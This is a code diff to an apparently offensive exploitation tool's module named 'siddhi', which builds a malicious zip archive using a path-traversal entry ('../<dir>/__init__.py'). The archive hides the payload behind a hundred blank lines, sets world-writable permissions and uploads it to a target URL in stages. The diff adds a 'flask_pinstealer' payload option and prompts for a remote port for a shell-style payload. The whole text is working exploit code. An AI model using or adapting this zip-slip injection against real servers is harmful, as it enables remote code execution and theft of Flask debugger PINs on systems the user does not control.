@@ -129,7 +129,6 @@ class siddhi:
                 print("[{}] → Nothing to do, leaving the ship ...\n".format(xpl_hl))
                 sleep(1)
                 sys.exit(1)
-
         else:
             payload_type = self.vmnf_handler['payload_type']
 
@@ -151,8 +150,10 @@ class siddhi:
             self.vmnf_handler['xpl_cmd_var'] = str(g.person.title().replace('.','') + \
                 g.person.first_name() + g.text.word().title() + \
                     g.person.occupation().replace(' ','_'))
-
-            if not self.vmnf_handler['remote_port']:
+            
+            remote_port = self.vmnf_handler.get('remote_port')
+            #if not self.vmnf_handler['remote_port']:
+            if not remote_port:
                 remote_port = input('[{}] → Missing remote port! Inform the port or enter to choose automatically:  '.format(xpl_hl))
                 if not remote_port:
                     remote_port =  g.internet.port()
@@ -163,9 +164,12 @@ class siddhi:
                         print("[{}] → Nothing to do, leaving the ship ...\n".format(xpl_hl))
                         sleep(1)
                         sys.exit(1)
-
+            
             payload = VMNFPayloads(**self.vmnf_handler).pws_payload()
-
+        
+        elif payload_type == 'flask_pinstealer':
+            payload = VMNFPayloads(**self.vmnf_handler).flask_pinstealer()
+            
         target_dir = self.vmnf_handler['target_dir']
         if not target_dir:
             target_dir = input("[{}] → Specify the directory to deploy or enter for auto selection (common dirs): ".format(xpl_hl))
@@ -189,22 +193,32 @@ class siddhi:
         print("[{}] → Building malicious zipfile: {}.zip...".format(xpl_hl,filename))
         sleep(1)
         
-        payload = ('\n'*100 + payload)
+        payload = ('\n'*100 + str(payload))
         zip_file = str(filename) + ".zip"
         z_info = zipfile.ZipInfo(r"../{}/__init__.py".format(target_dir))
         z_file = zipfile.ZipFile('/tmp/' + zip_file, mode="w")
         z_file.writestr(z_info, payload)
         z_info.external_attr = 0o777 << 16                  
         z_file.close()
-
-        zip_ = open('/tmp/' + zip_file, 'rb')
-        files = {'file': zip_}
         
         print("[{}] → Uploading {} to {}...".format(xpl_hl,filename, self.vmnf_handler['target_url']))
         sleep(1)
         try:
-            upload = requests.post(
-            self.vmnf_handler['target_url'],files=files)
+            # stages were introduced to manage some new payloads:fps
+            stages = 3 if payload_type == 'flask_pinstealer' else 2
+            for stage in range(1,stages): 
+                print("[{}]   + Sending {} stage {}/{}...".format(
+                    xpl_hl,
+                    self.vmnf_handler['payload_type'],
+                    stage,
+                    stages - 1
+                    )
+                )
+                sleep(10)
+                zip_ = open('/tmp/' + zip_file, 'rb')
+                files = {'file': zip_}
+                upload = requests.post(
+                self.vmnf_handler['target_url'],files=files)
         except requests.exceptions.ConnectionError:
             # maybe server is up or not running on a given port 
             print("[{}] → Could not upload the exploit. Make sure that --target-url parameter is correct...".format(
